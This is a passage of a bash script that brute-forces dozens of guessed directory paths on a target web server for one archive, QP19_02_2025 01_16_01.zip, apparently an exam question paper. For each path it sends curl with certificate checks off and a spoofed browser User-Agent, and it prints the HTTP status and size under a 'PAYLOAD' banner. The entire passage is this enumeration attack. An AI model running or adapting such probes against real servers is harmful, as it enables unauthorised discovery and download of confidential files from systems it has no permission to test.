code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUpload_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUpload_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [PlatformQPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}PlatformQPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}PlatformQPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor_DataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor_DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor_DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulkFileProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulkFileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulkFileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem-DataProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem-DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem-DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUpload_QPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUpload_QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUpload_QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Tool_QPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Tool_QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Tool_QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl_Platform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl_Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl_Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmtSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmtSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmtSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Management_QP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Management_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Management_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUpload_ExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUpload_ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUpload_ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessor-QPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessor-QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessor-QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystem-QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystem-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystem-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControlSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControlSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControlSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB_ProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB_ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB_ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSync-Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSync-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSync-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Management-QPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Management-QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Management-QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile_BulkUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile_BulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile_BulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaperMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaperMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaperMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationQPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationQPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationQPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Panel-QPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Panel-QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Panel-QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFileUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch_FileUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch_FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch_FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile-DataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile-DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile-DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Tool_QPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Tool_QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Tool_QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Tool_QPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Tool_QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Tool_QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile-Suite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile-Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile-Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper-HandlingModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper-HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper-HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUpload_QstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUpload_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUpload_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper_Monitoring/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper_Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper_Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService-Ops/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService-Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService-Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler-BulkUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler-BulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler-BulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflowUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflowUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflowUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUpload-QPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUpload-QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUpload-QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor_Handling/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor_Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor_Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow-System/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow-System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow-System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Mgmt_QPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Mgmt_QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Mgmt_QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Suite_ExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Suite_ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Suite_ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUpload-Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUpload-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
